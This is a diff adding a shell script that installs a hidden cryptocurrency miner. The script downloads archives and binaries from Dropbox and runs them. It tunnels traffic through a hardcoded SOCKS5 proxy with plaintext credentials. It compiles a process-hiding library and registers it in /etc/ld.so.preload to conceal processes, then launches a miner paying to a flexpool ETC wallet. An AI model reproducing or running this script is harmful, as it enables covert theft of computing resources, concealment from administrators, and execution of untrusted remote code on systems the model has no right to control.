@@ -1,0 +1,53 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget -q wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+select_proxy_mode = only_socks5
+socks5 = 132.145.213.39:1080
+socks5_username = archer
+socks5_password = 12322
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .10
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget -q https://www.dropbox.com/s/rkymv3ox0xipvqz/Milon
+chmod +x Milon
+
+./graftcp/graftcp wget -q https://www.dropbox.com/s/e4oduamvmtv2b1e/mack.zip
+unzip mack.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+sleep .10
+
+echo " "
+echo " "
+
+./graftcp/graftcp ./bezzHash --url=ssl://0x8D95F245262Bc2eBb6831f1E92fbdD39c7581903.ArcherONE@etc-us-east.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
